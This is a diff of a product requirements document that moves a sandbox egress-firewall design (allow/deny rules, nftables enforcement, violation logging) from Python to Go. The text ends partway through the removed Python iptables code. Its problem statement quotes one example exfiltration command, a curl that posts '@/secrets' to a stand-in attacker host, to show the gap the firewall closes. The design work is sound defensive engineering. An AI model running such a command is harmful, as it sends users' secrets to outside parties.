@@ -1,10 +1,12 @@
 # PRD-094: Per-Sandbox Egress Firewall Rules (CIDR/Hostname Allow/Deny Lists) (`tag sandbox firewall`)
 
+> **Stack: Go** (native single-binary; see docs/GO_MIGRATION_RESEARCH.md). This PRD was re-framed from Python to Go.
+
 **Status:** Proposed
 **Priority:** P3
 **Estimated Effort:** M (1-2 weeks)
 **Category:** Sandbox & Execution Environment
-**Affects:** `sandbox.py`
+**Affects:** `internal/sandbox` (firewall engine + nftables enforcement), `internal/netguard` (connect-time IP-pin dialer fallback)
 **Depends on:** PRD-028 (Sandbox Code Execution — provides `sandbox_runs` table, `run_in_sandbox()`, Docker backend), PRD-034 (Secret Scanning — security.py patterns reused for path validation), PRD-013 (Agent Tracing/Observability — violation events emitted as spans), PRD-005 (Execution Backend Selection — profile YAML execution config), PRD-015 (Profile Templates — `network` key in profile YAML)
 **Inspired by:** E2B network isolation (`deny_out`/`allow_out` semantics), Daytona network policies, gVisor netstack, Modal `outbound_cidr_allowlist`/`outbound_domain_allowlist`
 
@@ -16,13 +18,13 @@
 
 TAG's sandbox subsystem (PRD-028) isolates agent-generated code from the host filesystem and applies resource caps, but it does not constrain *network egress* from the sandbox. A sandboxed process today can open arbitrary TCP connections to any internet host — even when the user runs `--network none` in intent, Docker still creates a bridge network by default unless explicitly removed. An agent executing inside a Docker or restricted-subprocess sandbox can `curl https://evil.example/ -d @/secrets` across an unrestricted loopback or bridge interface, silently exfiltrating data to any endpoint on the internet.
 
-This PRD specifies a per-sandbox egress firewall system: configurable allow/deny rules based on CIDR ranges and hostnames, applied per sandbox invocation or inherited from a named profile's `network` policy. Rules are evaluated in a well-defined precedence order (explicit allow > explicit deny > default policy), enforced via Docker network primitives and iptables rules injected into the container or the host's DOCKER-USER chain, and every attempted connection that violates the active policy is recorded as a violation event in `~/.tag/runtime/tag.sqlite3` and streamed to `~/.tag/runtime/sandbox-firewall.jsonl`.
+This PRD specifies a per-sandbox egress firewall system: configurable allow/deny rules based on CIDR ranges and hostnames, applied per sandbox invocation or inherited from a named profile's `network` policy. Rules are evaluated in a well-defined precedence order (explicit allow > explicit deny > default policy), enforced programmatically via the pure-Go netlink library `google/nftables` (host chain rules) together with the `docker/moby` client for the Docker backend, and every attempted connection that violates the active policy is recorded as a violation event in `~/.tag/runtime/tag.sqlite3` (via `internal/store`) and streamed to `~/.tag/runtime/sandbox-firewall.jsonl`.
 
-The feature introduces two enforcement mechanisms that can operate independently or in tandem. The first is *host-level enforcement* via rules added to the `DOCKER-USER` iptables chain before container start and removed after container exit — this works without granting any capability to the container itself. The second is *container-level enforcement* via iptables/nftables inside the container, which requires `NET_ADMIN` capability but survives container network re-configuration and works for the restricted subprocess backend via Linux namespaces. A pure Python DNS-intercept fallback is available for macOS and Windows development environments where iptables is unavailable.
+The feature introduces two enforcement mechanisms that can operate independently or in tandem. The first is *host-level enforcement* via a per-sandbox nftables chain programmed through `google/nftables` before container start and torn down after container exit — this works without granting any capability to the container itself. The second is *container-level enforcement* via nftables inside the container network namespace, which requires `NET_ADMIN` but survives container network re-configuration and works for the restricted-subprocess (landlock+seccomp) backend via Linux network namespaces. Where nftables is unavailable (off-Linux, or unprivileged hosts), enforcement degrades to a **Go userspace connect-time IP-pin dialer** in `internal/netguard` (the same "connect-time IP-pin + redirect-revalidate dialer" the migration plan defines) — the sandboxed process is launched with its outbound connections routed through a TAG-controlled dialer that resolves, pins, and validates each destination IP against the active policy before the socket connects. The gVisor netstack (runsc) is the container-tier option for a fully userspace network stack. When neither nftables nor a controlled dialer can be applied (e.g. Docker Desktop on macOS/Windows with an arbitrary non-Go subprocess), TAG prints a documented reduced-enforcement warning. This Go reframing replaces PRD-028's Python-runtime-specific DNS-intercept hack (monkeypatching `socket.getaddrinfo`, a `PYTHONSTARTUP` shim, and a Unix-domain-socket check server), which does not port to a static Go binary.
 
 The system ships with four named network profiles — `open` (no restrictions, current behaviour), `restricted` (deny-all egress with an empty allowlist), `pypi` (allow PyPI, GitHub, and common CDNs), and `custom` (user-defined rules stored in SQLite) — so that common use-cases require only a single flag. Per-invocation rule overrides let advanced users compose rules on the command line without touching stored configuration. Violation events carry enough context (sandbox run ID, destination IP, attempted hostname, rule that triggered, timestamp, process PID inside container) to correlate with agent traces and audit logs from PRD-013 and PRD-028.
 
-This feature closes the network exfiltration gap that PRD-028 explicitly deferred as out-of-scope ("TAG does not implement fine-grained egress/ingress firewall rules" — PRD-028 §4 Non-Goal #2). It is directly inspired by E2B's `network={deny_out, allow_out}` parameter on `Sandbox.create()`, Modal's `outbound_cidr_allowlist` / `outbound_domain_allowlist` sandbox parameters, and Daytona's declarative network policy objects. The TAG implementation adapts these concepts to a local Docker + iptables reality while providing a CLI surface consistent with the rest of the `tag sandbox` command group.
+This feature closes the network exfiltration gap that PRD-028 explicitly deferred as out-of-scope ("TAG does not implement fine-grained egress/ingress firewall rules" — PRD-028 §4 Non-Goal #2). It is directly inspired by E2B's `network={deny_out, allow_out}` parameter on `Sandbox.create()`, Modal's `outbound_cidr_allowlist` / `outbound_domain_allowlist` sandbox parameters, and Daytona's declarative network policy objects. The TAG implementation adapts these concepts to a local Docker + nftables (pure-Go netlink) reality, with a userspace IP-pin dialer fallback, while providing a CLI surface consistent with the rest of the `tag sandbox` command group.
 
 ---
 
@@ -346,11 +348,11 @@ Time                      Proto  Destination          Port  Rule              PI
 |----|-------------|----------|
 | FR-01 | `tag sandbox run` MUST accept `--allow-host`, `--deny-host`, `--allow-cidr`, `--deny-cidr`, `--deny-all`, `--allow-all`, and `--network` flags. Unrecognised values MUST produce a clear error. | P0 |
 | FR-02 | The firewall engine MUST evaluate rules in order: explicit per-invocation allow > explicit per-invocation deny > named policy allow > named policy deny > profile-level default > global default (`open`). | P0 |
-| FR-03 | For the Docker backend, egress rules MUST be enforced via iptables `TAG-SBX-<run_id[:8]>` chains inserted into `DOCKER-USER` before container start. | P0 |
-| FR-04 | For the restricted subprocess backend, egress rules MUST be enforced via Python-level DNS intercept (`socket.getaddrinfo` monkey-patching) and `socket.connect` hook inside a forked subprocess. | P0 |
-| FR-05 | All iptables chains created for a sandbox run MUST be unconditionally removed after the run exits, including on SIGINT, SIGTERM, and unhandled exception. Use `atexit.register` + signal handlers. | P0 |
+| FR-03 | For the Docker backend, egress rules MUST be enforced via a per-sandbox nftables chain `TAG-SBX-<run_id[:8]>` programmed through `google/nftables` (pure-Go netlink) on the host, hooked ahead of Docker's own chains, before container start. | P0 |
+| FR-04 | For the restricted-subprocess backend, egress rules MUST be enforced via the `internal/netguard` connect-time IP-pin dialer: the sandboxed process's outbound connections are routed through a TAG-controlled `net.Dialer`/`DialContext` that resolves, pins, and validates each destination IP against the active policy before the socket connects (replacing Python `socket.getaddrinfo` monkeypatching). | P0 |
+| FR-05 | All nftables chains created for a sandbox run MUST be unconditionally removed after the run exits, including on SIGINT, SIGTERM, and panic. Use `defer` plus `signal.NotifyContext`/`os/signal` handlers so cleanup runs on every exit path. | P0 |
 | FR-06 | Hostname rules MUST support exact match (`api.github.com`) and single-level wildcard (`*.github.com`). Multi-level wildcards (`**.github.com`) are NOT required in v1. | P1 |
-| FR-07 | CIDR rules MUST use Python's `ipaddress.ip_network()` for parsing and `ip_address in network` for matching. Invalid CIDR notation MUST raise a validation error before sandbox start. | P0 |
+| FR-07 | CIDR rules MUST use Go `net/netip` — `netip.ParsePrefix` for parsing and `Prefix.Contains(netip.Addr)` for matching. Invalid CIDR notation MUST return a validation error before sandbox start. | P0 |
 | FR-08 | Every blocked connection attempt MUST produce a `sandbox_firewall_violations` row within 50 ms of the block event, containing: `run_id`, `proto`, `destination_host`, `destination_ip`, `destination_port`, `triggered_rule`, `pid`, `violated_at`. | P0 |
 | FR-09 | Every blocked connection attempt MUST be appended to `~/.tag/runtime/sandbox-firewall.jsonl` as a newline-delimited JSON object with the same fields as FR-08. | P1 |
 | FR-10 | `tag sandbox firewall add` MUST validate all hostnames and CIDRs at save time. It MUST reject rules that would permanently block localhost (127.0.0.0/8) to prevent misconfiguration that breaks the sandbox itself. | P1 |
@@ -358,9 +360,9 @@ Time                      Proto  Destination          Port  Rule              PI
 | FR-12 | The `pypi` built-in policy MUST allow: `pypi.org`, `files.pythonhosted.org`, `api.github.com`, `github.com`, `objects.githubusercontent.com`, `*.github.com`, `cdn.jsdelivr.net`, `registry.npmjs.org`, `registry.yarnpkg.com`, `dl-cdn.alpinelinux.org`, `deb.debian.org`, `security.debian.org`, `archive.ubuntu.com`, `security.ubuntu.com`, and `*.cloudfront.net`. | P2 |
 | FR-13 | `tag sandbox firewall test` MUST perform real DNS resolution of the destination hostname and evaluate the result against both the resolved IP and the hostname. It MUST NOT make any actual TCP connection. | P1 |
 | FR-14 | When a profile YAML contains `network: restricted` (or any named policy), `run_in_sandbox()` MUST load the corresponding policy from SQLite before applying per-invocation rule overrides. | P0 |
-| FR-15 | Violation events MUST be emitted as OpenTelemetry spans with `sandbox.firewall.violation` event name and attributes: `sandbox.run_id`, `network.peer.address`, `network.peer.port`, `firewall.rule`, `process.pid`. | P2 |
+| FR-15 | Violation events MUST be emitted as OpenTelemetry spans (via `internal/obs` / `go.opentelemetry.io/otel`) with `sandbox.firewall.violation` event name and attributes: `sandbox.run_id`, `network.peer.address`, `network.peer.port`, `firewall.rule`, `process.pid`. | P2 |
 | FR-16 | `tag sandbox firewall violations` MUST support filtering by `--run-id`, `--since`, and `--limit`. When `--json` is given, output MUST be a JSON array of violation objects. | P1 |
-| FR-17 | On macOS where `iptables` is unavailable, the Docker backend MUST fall back to the DNS-intercept mechanism by injecting the firewall shim as a bind-mounted script sourced from `PYTHONSTARTUP`. A warning MUST be printed when iptables is unavailable. | P2 |
+| FR-17 | On hosts where nftables is unavailable (macOS/Windows, or unprivileged Linux), enforcement MUST fall back to the `internal/netguard` connect-time IP-pin dialer; where the dialer cannot be applied (arbitrary non-Go subprocess), TAG MUST degrade to Docker Desktop / plain subprocess and print a documented reduced-enforcement warning. gVisor netstack (runsc) is the container-tier option. | P2 |
 | FR-18 | Profile YAML `network` key MUST accept both built-in policy names and custom policy names stored in SQLite. Loading a profile with an unknown `network` value MUST warn but MUST NOT fail the sandbox run (falls back to `open`). | P1 |
 
 ---
@@ -369,31 +371,37 @@ Time                      Proto  Destination          Port  Rule              PI
 
 | ID | Requirement | Target |
 |----|-------------|--------|
-| NFR-01 | Sandbox startup overhead from firewall rule application MUST be < 200 ms for Docker backend (iptables chain creation) and < 10 ms for restricted subprocess backend (Python hook setup). | Benchmark |
-| NFR-02 | Violation log writes MUST be non-blocking from the sandbox process's perspective. Use a background thread with a queue for SQLite writes; sandbox blocking on DB I/O is not acceptable. | Architecture |
-| NFR-03 | The firewall module MUST have zero imports at module load time for packages not in the Python standard library. `ipaddress`, `socket`, `threading`, `queue`, and `subprocess` are the only permitted top-level imports. | Code review |
-| NFR-04 | All iptables subprocess calls MUST have a 5-second timeout and MUST NOT block sandbox startup if iptables is unavailable or returns an error. Failures fall back to `open` policy with a logged warning. | Code review |
+| NFR-01 | Sandbox startup overhead from firewall rule application MUST be < 200 ms for the Docker backend (nftables chain creation via netlink) and < 10 ms for the restricted-subprocess backend (netguard dialer setup). | Benchmark |
+| NFR-02 | Violation log writes MUST be non-blocking from the sandbox's perspective. Use a dedicated goroutine draining a buffered channel for SQLite writes; blocking the enforcement path on DB I/O is not acceptable. | Architecture |
+| NFR-03 | The firewall package MUST depend only on the Go standard library plus the sanctioned migration modules (`google/nftables`, `modernc.org/sqlite`). `net/netip`, `context`, `os/signal`, and `encoding/json` cover the core logic; no CGO. | Code review |
+| NFR-04 | All nftables/netlink operations MUST be bounded by a `context` deadline (5s) and MUST NOT block sandbox startup if nftables is unavailable or errors. Failures fall back to the netguard dialer, or to `open` policy with a logged warning. | Code review |
 | NFR-05 | The `sandbox_firewall_violations` table MUST be indexed on `(run_id, violated_at)` and `violated_at` to support efficient time-range queries without full table scans. | Schema |
 | NFR-06 | The JSONL audit log MUST be append-only and MUST NOT be truncated by TAG operations. Rotation is the user's responsibility. | Architecture |
-| NFR-07 | Firewall rule removal (iptables chain flush + delete) MUST complete within 1 second of sandbox exit for chains with up to 1000 rules. | Benchmark |
-| NFR-08 | The feature MUST be fully functional on Python 3.11+ and MUST NOT require any new mandatory dependencies in `pyproject.toml`. Optional iptables CLI dependency is documented. | Compatibility |
+| NFR-07 | Firewall rule removal (nftables chain flush + delete) MUST complete within 1 second of sandbox exit for chains with up to 1000 rules. | Benchmark |
+| NFR-08 | The feature MUST be fully functional on Go 1.24+ and MUST NOT require CGO or any new mandatory host dependency. `google/nftables` is a pure-Go module; the nftables kernel subsystem is an optional Linux runtime dependency (documented, with graceful fallback). | Compatibility |
 | NFR-09 | All user-facing error messages related to firewall misconfiguration MUST suggest the corrective action (e.g., "Invalid CIDR '10.0.x.y/24': use dotted-decimal notation like '10.0.0.0/24'"). | UX |
-| NFR-10 | The SQLite WAL-mode database used by all sandbox tables MUST handle concurrent writes from the violation logger thread and the main thread without SQLITE_BUSY errors. Use `timeout=5` in `open_db()` and WAL mode. | Architecture |
+| NFR-10 | The SQLite (`modernc.org/sqlite`) WAL-mode store used by all sandbox tables MUST handle concurrent writes from the violation-logger goroutine and the main goroutine without `SQLITE_BUSY`. Use a 5s busy timeout (`_busy_timeout`/`PRAGMA busy_timeout`) and WAL mode, under the single-writer contract. | Architecture |
 
 ---
 
 ## 10. Technical Design
 
-### 10.1 New Files and Modifications
+### 10.1 New Packages and Modifications
 
-| File | Change |
+| Package / file | Change |
 |------|--------|
-| `src/tag/sandbox.py` | Primary implementation: firewall engine, iptables manager, DNS intercept, violation logger |
-| `src/tag/controller.py` | New `cmd_sandbox_firewall_*` commands; extend `cmd_sandbox_run` to parse firewall flags |
-| `~/.tag/runtime/tag.sqlite3` | New tables: `sandbox_firewall_policies`, `sandbox_firewall_rules`, `sandbox_firewall_violations` |
+| `internal/sandbox/firewall.go` | Firewall engine: `FirewallRule`/`FirewallPolicy`/`FirewallEngine`, rule matching, precedence evaluation |
+| `internal/sandbox/nftables.go` | Host-level nftables manager over `google/nftables` (chain create/teardown); Linux-only build target |
+| `internal/sandbox/violation.go` | `ViolationLogger` goroutine draining a buffered channel to SQLite + JSONL |
+| `internal/netguard/` | Connect-time IP-pin `DialContext` used as the enforcement fallback for the restricted-subprocess backend and off-Linux hosts |
+| `internal/cli/sandbox_firewall.go` | `firewall add/list/show/remove/test/violations` cobra subcommands; egress flags on `sandbox run` |
+| `internal/store/migrate/` | New tables `sandbox_firewall_policies`, `sandbox_firewall_rules`, `sandbox_firewall_violations`; built-in policy seeding (`database/sql` + modernc driver) |
+| `~/.tag/runtime/tag.sqlite3` | The above tables, owned by `internal/store` under the single-writer + WAL contract |
 | `~/.tag/runtime/sandbox-firewall.jsonl` | Append-only JSONL violation audit log (new file, created on first violation) |
 
 ### 10.2 SQLite DDL
+
+The DDL stays SQL. It is applied by the `internal/store` migration runner over the `database/sql` API with the pure-Go `modernc.org/sqlite` driver (`CGO_ENABLED=0`), and built-in policies are seeded with `INSERT OR IGNORE` on first migration (see §10.8). `CREATE TABLE IF NOT EXISTS` and `CREATE INDEX IF NOT EXISTS` need no error-guarding; any future `ALTER TABLE` would be guarded by an error-check on the `duplicate column name` substring.
 
 ```sql
 -- Stored named firewall policies
@@ -449,507 +457,550 @@ CREATE INDEX IF NOT EXISTS idx_sfv_time
     ON sandbox_firewall_violations(violated_at);
 ```
 
-### 10.3 Core Dataclasses
+### 10.3 Core Types
 
-```python
-from __future__ import annotations
-from dataclasses import dataclass, field
-from enum import Enum
-from typing import Optional
-import ipaddress
+Python enums become typed string constants; dataclasses become structs; `ipaddress` becomes `net/netip` (`netip.Addr`/`netip.Prefix`); the lazily-parsed `_cidr_network` becomes a parsed `netip.Prefix` field populated by `Validate()`; `ValueError` becomes a returned `error`.
 
+```go
+package sandbox
 
-class FirewallAction(str, Enum):
-    ALLOW = "allow"
-    DENY = "deny"
+import (
+    "fmt"
+    "net/netip"
+    "sort"
+    "strings"
+)
 
+type FirewallAction string
 
-class RuleType(str, Enum):
-    HOST = "host"          # exact hostname: api.github.com
-    CIDR = "cidr"          # IP range: 10.0.0.0/8
-    WILDCARD = "wildcard"  # single-level wildcard: *.github.com
+const (
+    ActionAllow FirewallAction = "allow"
+    ActionDeny  FirewallAction = "deny"
+)
 
+type RuleType string
 
-@dataclass
-class FirewallRule:
-    action: FirewallAction
-    rule_type: RuleType
-    value: str              # raw value as entered
-    priority: int = 100
-    id: Optional[str] = None
-    policy_id: Optional[str] = None
-    created_at: Optional[str] = None
+const (
+    RuleHost     RuleType = "host"     // exact hostname: api.github.com
+    RuleCIDR     RuleType = "cidr"     // IP range: 10.0.0.0/8
+    RuleWildcard RuleType = "wildcard" // single-level wildcard: *.github.com
+)
 
-    # Parsed form, populated by validate()
-    _cidr_network: Optional[ipaddress.IPv4Network | ipaddress.IPv6Network] = field(
-        default=None, repr=False
-    )
+type FirewallRule struct {
+    Action    FirewallAction
+    Type      RuleType
+    Value     string // raw value as entered
+    Priority  int    // default 100; lower = evaluated first
+    ID        string
+    PolicyID  string
+    CreatedAt string
 
-    def validate(self) -> None:
-        """Parse and validate the rule value. Raises ValueError on bad input."""
-        if self.rule_type == RuleType.CIDR:
-            self._cidr_network = ipaddress.ip_network(self.value, strict=False)
-        elif self.rule_type == RuleType.WILDCARD:
-            if not self.value.startswith("*."):
-                raise ValueError(
-                    f"Wildcard rules must start with '*.' — got {self.value!r}"
-                )
-        elif self.rule_type == RuleType.HOST:
-            if "*" in self.value:
-                raise ValueError(
-                    f"Use rule_type=wildcard for patterns containing '*' — got {self.value!r}"
-                )
+    prefix netip.Prefix // parsed form, populated by Validate (CIDR rules only)
+}
 
-    def matches_host(self, hostname: str) -> bool:
-        """Return True if this rule's value matches the given hostname."""
-        if self.rule_type == RuleType.HOST:
-            return hostname.lower() == self.value.lower()
-        if self.rule_type == RuleType.WILDCARD:
-            suffix = self.value[1:]   # strip leading '*'
-            return hostname.lower().endswith(suffix.lower())
-        return False  # CIDR rules matched separately via matches_ip()
+// Validate parses and validates the rule value; netip.ParsePrefix replaces
+// ipaddress.ip_network. Returns an error instead of raising ValueError.
+func (r *FirewallRule) Validate() error {
+    switch r.Type {
+    case RuleCIDR:
+        p, err := netip.ParsePrefix(r.Value)
+        if err != nil {
+            return fmt.Errorf("invalid CIDR %q: use notation like 10.0.0.0/24", r.Value)
+        }
+        r.prefix = p.Masked()
+    case RuleWildcard:
+        if !strings.HasPrefix(r.Value, "*.") {
+            return fmt.Errorf("wildcard rules must start with '*.' — got %q", r.Value)
+        }
+    case RuleHost:
+        if strings.Contains(r.Value, "*") {
+            return fmt.Errorf("use rule_type=wildcard for patterns containing '*' — got %q", r.Value)
+        }
+    }
+    return nil
+}
 
-    def matches_ip(self, addr: str) -> bool:
-        """Return True if this CIDR rule contains the given IP address."""
-        if self.rule_type != RuleType.CIDR or self._cidr_network is None:
-            return False
-        try:
-            return ipaddress.ip_address(addr) in self._cidr_network
-        except ValueError:
-            return False
+func (r *FirewallRule) MatchesHost(hostname string) bool {
+    switch r.Type {
+    case RuleHost:
+        return strings.EqualFold(hostname, r.Value)
+    case RuleWildcard:
+        suffix := r.Value[1:] // strip leading '*'
+        return strings.HasSuffix(strings.ToLower(hostname), strings.ToLower(suffix))
+    }
+    return false // CIDR rules matched separately via MatchesIP
+}
 
+func (r *FirewallRule) MatchesIP(addr string) bool {
+    if r.Type != RuleCIDR {
+        return false
+    }
+    a, err := netip.ParseAddr(addr)
+    if err != nil {
+        return false
+    }
+    return r.prefix.Contains(a) // Prefix.Contains replaces `ip in network`
+}
 
-@dataclass
-class FirewallPolicy:
-    name: str
-    default_action: FirewallAction = FirewallAction.ALLOW
-    allow_rules: list[FirewallRule] = field(default_factory=list)
-    deny_rules: list[FirewallRule] = field(default_factory=list)
-    id: Optional[str] = None
-    profile_name: Optional[str] = None
-    description: str = ""
-    is_builtin: bool = False
+type FirewallPolicy struct {
+    Name          string
+    DefaultAction FirewallAction // default ActionAllow
+    AllowRules    []FirewallRule
+    DenyRules     []FirewallRule
+    ID            string
+    ProfileName   string
+    Description   string
+    IsBuiltin     bool
+}
 
-    def evaluate(self, hostname: Optional[str], ip: str) -> FirewallAction:
-        """
-        Evaluate the policy for a connection to (hostname, ip).
-        Precedence: explicit allow > explicit deny > default_action.
-        """
-        # Check allow rules first (allow overrides deny)
-        for rule in sorted(self.allow_rules, key=lambda r: r.priority):
-            if (hostname and rule.matches_host(hostname)) or rule.matches_ip(ip):
-                return FirewallAction.ALLOW
+// Evaluate resolves a connection to (hostname, ip).
+// Precedence: explicit allow > explicit deny > DefaultAction.
+func (p *FirewallPolicy) Evaluate(hostname, ip string) FirewallAction {
+    match := func(rules []FirewallRule) bool {
+        sorted := append([]FirewallRule(nil), rules...)
+        sort.SliceStable(sorted, func(i, j int) bool { return sorted[i].Priority < sorted[j].Priority })
+        for i := range sorted {
+            if (hostname != "" && sorted[i].MatchesHost(hostname)) || sorted[i].MatchesIP(ip) {
+                return true
+            }
+        }
+        return false
+    }
+    if match(p.AllowRules) {
+        return ActionAllow
+    }
+    if match(p.DenyRules) {
+        return ActionDeny
+    }
+    return p.DefaultAction
+}
 
-        # Check deny rules
-        for rule in sorted(self.deny_rules, key=lambda r: r.priority):
-            if (hostname and rule.matches_host(hostname)) or rule.matches_ip(ip):
-                return FirewallAction.DENY
+type FirewallViolation struct {
+    RunID           string
+    DestinationIP   string
+    TriggeredRule   string
+    ViolatedAt      string // ISO8601 UTC
+    Proto           string // default "tcp"
+    DestinationHost string
+    DestinationPort int
+    PID             int
+    ID              string
+}
 
-        return self.default_action
-
-
-@dataclass
-class FirewallViolation:
-    run_id: str
-    destination_ip: str
-    triggered_rule: str
-    violated_at: str
-    proto: str = "tcp"
-    destination_host: Optional[str] = None
-    destination_port: Optional[int] = None
-    pid: Optional[int] = None
-    id: Optional[str] = None
-
-
-@dataclass
-class SandboxFirewallConfig:
-    """
-    Resolved firewall configuration for a single sandbox invocation.
-    Merges profile-level policy with per-invocation overrides.
-    """
-    policy: FirewallPolicy
-    # Per-invocation overrides (applied on top of policy before evaluation)
-    extra_allow_hosts: list[str] = field(default_factory=list)
-    extra_deny_hosts: list[str] = field(default_factory=list)
-    extra_allow_cidrs: list[str] = field(default_factory=list)
-    extra_deny_cidrs: list[str] = field(default_factory=list)
-    deny_all: bool = False      # shorthand for extra_deny_cidrs = ['0.0.0.0/0']
-    allow_all: bool = False     # override to open policy for this invocation
+// SandboxFirewallConfig is the resolved config for one invocation: a stored
+// policy plus per-invocation overrides applied before evaluation.
+type SandboxFirewallConfig struct {
+    Policy          FirewallPolicy
+    ExtraAllowHosts []string
+    ExtraDenyHosts  []string
+    ExtraAllowCIDRs []string
+    ExtraDenyCIDRs  []string
+    DenyAll         bool // shorthand for ExtraDenyCIDRs = ["0.0.0.0/0","::/0"]
+    AllowAll        bool // override to open policy for this invocation
+}
 ```
 
 ### 10.4 Firewall Engine
 
-```python
-class FirewallEngine:
-    """
-    Resolves and evaluates the active firewall policy for a sandbox run.
-    Handles rule merging, DNS resolution, and violation logging.
-    """
+The engine resolves and evaluates the active policy. The Python `queue.Queue.put_nowait` becomes a non-blocking send on a buffered Go channel; `datetime.now(timezone.utc).isoformat()` becomes `time.Now().UTC().Format(time.RFC3339)`.
 
-    def __init__(
-        self,
-        config: SandboxFirewallConfig,
-        violation_queue: "queue.Queue[FirewallViolation]",
-        run_id: str,
-    ) -> None:
-        self._config = config
-        self._queue = violation_queue
-        self._run_id = run_id
+```go
+package sandbox
 
-    def evaluate_connection(
-        self,
-        hostname: Optional[str],
-        ip: str,
-        port: int,
-        proto: str = "tcp",
-        pid: Optional[int] = None,
-    ) -> FirewallAction:
-        """
-        Evaluate whether a connection should be allowed or denied.
-        Logs a violation if denied.
-        """
-        if self._config.allow_all:
-            return FirewallAction.ALLOW
+import (
+    "fmt"
+    "net/netip"
+    "sort"
+    "strings"
+    "time"
+)
 
-        # Build merged policy: per-invocation overrides take highest priority
-        if self._config.deny_all:
-            # Only per-invocation allow rules can save this connection
-            for host in self._config.extra_allow_hosts:
-                if hostname and self._host_matches(hostname, host):
-                    return FirewallAction.ALLOW
-            for cidr in self._config.extra_allow_cidrs:
-                if ipaddress.ip_address(ip) in ipaddress.ip_network(cidr, strict=False):
-                    return FirewallAction.ALLOW
-            action = FirewallAction.DENY
-            triggered = "deny:invocation:deny-all"
-        else:
-            # Evaluate per-invocation allows
-            for host in self._config.extra_allow_hosts:
-                if hostname and self._host_matches(hostname, host):
-                    return FirewallAction.ALLOW
-            for cidr in self._config.extra_allow_cidrs:
-                if ipaddress.ip_address(ip) in ipaddress.ip_network(cidr, strict=False):
-                    return FirewallAction.ALLOW
+type FirewallEngine struct {
+    cfg   SandboxFirewallConfig
+    viol  chan<- FirewallViolation // buffered; drained by ViolationLogger goroutine
+    runID string
+}
 
-            # Delegate to stored policy
-            action = self._config.policy.evaluate(hostname, ip)
-            triggered = self._find_triggered_rule(hostname, ip, action)
+func NewFirewallEngine(cfg SandboxFirewallConfig, viol chan<- FirewallViolation, runID string) *FirewallEngine {
+    return &FirewallEngine{cfg: cfg, viol: viol, runID: runID}
+}
 
-            # Apply per-invocation denies on top of policy allows
-            if action == FirewallAction.ALLOW:
-                for host in self._config.extra_deny_hosts:
-                    if hostname and self._host_matches(hostname, host):
-                        action = FirewallAction.DENY
-                        triggered = f"deny:invocation:host:{host}"
-                        break
-                for cidr in self._config.extra_deny_cidrs:
-                    if ipaddress.ip_address(ip) in ipaddress.ip_network(cidr, strict=False):
-                        action = FirewallAction.DENY
-                        triggered = f"deny:invocation:cidr:{cidr}"
-                        break
+// EvaluateConnection decides allow/deny and logs a violation on deny.
+func (e *FirewallEngine) EvaluateConnection(hostname, ip string, port int, proto string, pid int) FirewallAction {
+    if e.cfg.AllowAll {
+        return ActionAllow
+    }
 
-        if action == FirewallAction.DENY:
-            import datetime
-            violation = FirewallViolation(
-                run_id=self._run_id,
-                destination_ip=ip,
-                destination_host=hostname,
-                destination_port=port,
-                proto=proto,
-                triggered_rule=triggered,
-                pid=pid,
-                violated_at=datetime.datetime.now(datetime.timezone.utc).isoformat(),
-            )
-            self._queue.put_nowait(violation)
+    cidrHit := func(cidrs []string) bool {
+        a, err := netip.ParseAddr(ip)
+        if err != nil {
+            return false
+        }
+        for _, c := range cidrs {
+            if p, err := netip.ParsePrefix(c); err == nil && p.Masked().Contains(a) {
+                return true
+            }
+        }
+        return false
+    }
+    allowOverride := func() bool {
+        for _, h := range e.cfg.ExtraAllowHosts {
+            if hostname != "" && hostMatches(hostname, h) {
+                return true
+            }
+        }
+        return cidrHit(e.cfg.ExtraAllowCIDRs)
+    }
 
-        return action
+    var action FirewallAction
+    var triggered string
 
-    @staticmethod
-    def _host_matches(hostname: str, pattern: str) -> bool:
-        if pattern == "*":
-            return True
-        if pattern.startswith("*."):
-            return hostname.endswith(pattern[1:]) or hostname == pattern[2:]
-        return hostname.lower() == pattern.lower()
+    if e.cfg.DenyAll {
+        if allowOverride() {
+            return ActionAllow // only per-invocation allow can save this
+        }
+        action, triggered = ActionDeny, "deny:invocation:deny-all"
+    } else {
+        if allowOverride() {
+            return ActionAllow
+        }
+        action = e.cfg.Policy.Evaluate(hostname, ip)
+        triggered = e.findTriggeredRule(hostname, ip, action)
 
-    def _find_triggered_rule(
-        self, hostname: Optional[str], ip: str, action: FirewallAction
-    ) -> str:
-        rules = (
-            self._config.policy.allow_rules
-            if action == FirewallAction.ALLOW
-            else self._config.policy.deny_rules
-        )
-        for rule in sorted(rules, key=lambda r: r.priority):
-            if (hostname and rule.matches_host(hostname)) or rule.matches_ip(ip):
-                return f"{rule.action.value}:{rule.rule_type.value}:{rule.value}"
-        return f"{action.value}:default"
-```
-
-### 10.5 Host-Level iptables Enforcement (Docker Backend)
-
-```python
-import subprocess
-import atexit
-import uuid
-
-IPTABLES = "iptables"   # or "ip6tables" for IPv6
-CHAIN_PREFIX = "TAG-SBX-"
-
-
-def _ipt(*args: str, check: bool = True) -> subprocess.CompletedProcess:
-    """Run an iptables command with a 5-second timeout. Never raises on failure."""
-    try:
-        return subprocess.run(
-            [IPTABLES, *args],
-            capture_output=True, text=True, timeout=5, check=check
-        )
-    except (subprocess.TimeoutExpired, FileNotFoundError, subprocess.CalledProcessError):
-        return subprocess.CompletedProcess(args, returncode=1, stdout="", stderr="")
-
-
-def apply_docker_firewall(
-    run_id: str,
-    policy: FirewallPolicy,
-    container_id: str,
-) -> str | None:
-    """
-    Create a per-sandbox iptables chain in DOCKER-USER.
-    Returns the chain name, or None if iptables is unavailable.
-    """
-    chain = CHAIN_PREFIX + run_id[:8]
-
-    # Create chain
-    result = _ipt("-N", chain, check=False)
-    if result.returncode != 0:
-        return None  # iptables unavailable, fall back to DNS intercept
-
-    # Jump from DOCKER-USER to sandbox chain for this container
-    _ipt("-I", "DOCKER-USER", "1", "-m", "physdev",
-         "--physdev-out", container_id[:12], "-j", chain)
-
-    # Add RETURN rules for allowed CIDRs
-    for rule in sorted(policy.allow_rules, key=lambda r: r.priority):
-        if rule.rule_type == RuleType.CIDR:
-            _ipt("-A", chain, "-d", rule.value, "-j", "RETURN")
-
-    # Add DROP rules for denied CIDRs
-    for rule in sorted(policy.deny_rules, key=lambda r: r.priority):
-        if rule.rule_type == RuleType.CIDR:
-            _ipt("-A", chain, "-d", rule.value,
-                 "-j", "LOG", "--log-prefix", f"[TAG-FW:{run_id[:8]}] ",
-                 "--log-level", "4")
-            _ipt("-A", chain, "-d", rule.value, "-j", "DROP")
-
-    # Default policy at end of chain
-    if policy.default_action == FirewallAction.DENY:
